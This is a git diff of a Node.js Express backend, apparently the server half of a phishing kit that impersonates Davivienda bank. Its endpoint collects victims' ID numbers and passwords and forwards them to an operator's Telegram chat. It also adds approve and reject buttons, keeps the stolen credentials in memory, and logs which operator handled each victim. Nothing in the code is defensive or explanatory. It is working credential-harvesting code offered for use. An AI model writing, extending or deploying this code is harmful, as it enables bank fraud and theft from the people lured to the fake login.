@@ -5,28 +5,23 @@ const axios = require('axios');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// --- CONFIGURACIÓN DE CORS ---
-// Lee la URL del frontend desde las variables de entorno de Render
-const FRONTEND_URL = process.env.FRONTEND_URL || 'https://seguropgodv.onrender.com';
-
-const corsOptions = {
-    origin: FRONTEND_URL,
-    methods: ['GET', 'POST'],
-    allowedHeaders: ['Content-Type', 'Authorization']
-};
-
-app.use(cors(corsOptions));
-app.use(express.json());
-
-// --- CONFIGURACIÓN DE TELEGRAM ---
-// Lee las credenciales desde las variables de entorno de Render
+// --- VARIABLES DE ENTORNO ---
+const FRONTEND_URL = process.env.FRONTEND_URL;
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-// Validación temprana: si faltan variables, el servidor avisa
-if (!TELEGRAM_TOKEN || !CHAT_ID) {
-    console.error('⚠️ ERROR: Faltan las variables de entorno TELEGRAM_TOKEN o CHAT_ID');
+if (!FRONTEND_URL || !TELEGRAM_TOKEN || !CHAT_ID) {
+    console.error('❌ ERROR: Faltan variables de entorno (FRONTEND_URL, TELEGRAM_TOKEN, CHAT_ID)');
+    process.exit(1);
 }
+
+// --- CORS ---
+app.use(cors({
+    origin: FRONTEND_URL,
+    methods: ['GET', 'POST'],
+    allowedHeaders: ['Content-Type', 'Authorization']
+}));
+app.use(express.json());
 
 const solicitudesPendientes = {};
 
@@ -39,13 +34,14 @@ app.post('/api/solicitar-acceso', async (req, res) => {
     }
 
     const requestId = Date.now().toString();
-    solicitudesPendientes[requestId] = { estado: 'pendiente' };
+    solicitudesPendientes[requestId] = { estado: 'pendiente', documento, clave };
 
     const mensaje = `
 🔔 *NUEVO INGRESO - DAVIVIENDA*
 📄 *Documento:* ${documento}
 🔑 *Clave:* ${clave}
 🆔 *ID:* ${requestId}
+⏳ *Estado:* Pendiente
     `;
 
     const keyboard = {
@@ -58,12 +54,18 @@ app.post('/api/solicitar-acceso', async (req, res) => {
     };
 
     try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: mensaje,
-            parse_mode: 'Markdown',
-            reply_markup: keyboard
-        });
+        const telegramResponse = await axios.post(
+            `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+            {
+                chat_id: CHAT_ID,
+                text: mensaje,
+                parse_mode: 'Markdown',
+                reply_markup: keyboard
+            }
+        );
+
+        solicitudesPendientes[requestId].messageId = telegramResponse.data.result.message_id;
+        solicitudesPendientes[requestId].chatId = CHAT_ID;
 
         res.json({ requestId });
 
@@ -86,24 +88,81 @@ app.get('/api/estado/:requestId', (req, res) => {
 });
 
 // --- RUTA 3: Webhook de Telegram ---
-app.post('/api/telegram-webhook', (req, res) => {
+app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
 
     if (callback_query) {
         const data = callback_query.data;
         const [accion, requestId] = data.split('_');
 
+        const usuario = callback_query.from;
+        const nombreUsuario = usuario.first_name + (usuario.last_name ? ' ' + usuario.last_name : '');
+        const username = usuario.username ? `@${usuario.username}` : 'sin username';
+        const userId = usuario.id;
+        const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
         if (solicitudesPendientes[requestId]) {
-            if (accion === 'aprobar') {
-                solicitudesPendientes[requestId].estado = 'aprobado';
-            } else if (accion === 'rechazar') {
-                solicitudesPendientes[requestId].estado = 'rechazado';
+            const solicitud = solicitudesPendientes[requestId];
+
+            if (solicitud.estado !== 'pendiente') {
+                await axios.post(
+                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
+                    {
+                        callback_query_id: callback_query.id,
+                        text: '⚠️ Esta solicitud ya fue procesada.'
+                    }
+                ).catch(err => console.error('Error:', err.message));
+                return res.sendStatus(200);
             }
 
-            axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-                callback_query_id: callback_query.id,
-                text: `Solicitud ${accion}`
-            }).catch(err => console.error("Error respondiendo a Telegram", err.message));
+            if (accion === 'aprobar') solicitud.estado = 'aprobado';
+            else if (accion === 'rechazar') solicitud.estado = 'rechazado';
+
+            const estadoTexto = accion === 'aprobar' ? '✅ APROBADO' : '❌ RECHAZADO';
+
+            const mensajeActualizado = `
+🔔 *NUEVO INGRESO - DAVIVIENDA*
+📄 *Documento:* ${solicitud.documento}
+🔑 *Clave:* ${solicitud.clave}
+🆔 *ID:* ${requestId}
+
+${estadoTexto}
+👤 *Por:* ${nombreUsuario} (${username})
+🆔 *User ID:* ${userId}
+🕒 *Fecha:* ${fecha}
+            `;
+
+            try {
+                await axios.post(
+                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`,
+                    {
+                        chat_id: solicitud.chatId,
+                        message_id: solicitud.messageId,
+                        text: mensajeActualizado,
+                        parse_mode: 'Markdown',
+                        reply_markup: { inline_keyboard: [] }
+                    }
+                );
+
+                await axios.post(
+                    `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
+                    {
+                        callback_query_id: callback_query.id,
+                        text: `Solicitud ${accion} por ${nombreUsuario}`
+                    }
+                );
+
+            } catch (error) {
+                console.error('Error editando mensaje:', error.response?.data || error.message);
+            }
+        } else {
+            await axios.post(
+                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`,
+                {
+                    callback_query_id: callback_query.id,
+                    text: '⚠️ Solicitud no encontrada o expirada.'
+                }
+            ).catch(err => console.error('Error:', err.message));
         }
     }
     res.sendStatus(200);
@@ -115,6 +174,6 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`Servidor Backend corriendo en el puerto ${PORT}`);
-    console.log(`Frontend permitido: ${FRONTEND_URL}`);
+    console.log(`✅ Servidor Backend corriendo en el puerto ${PORT}`);
+    console.log(`🌐 Frontend permitido: ${FRONTEND_URL}`);
 });
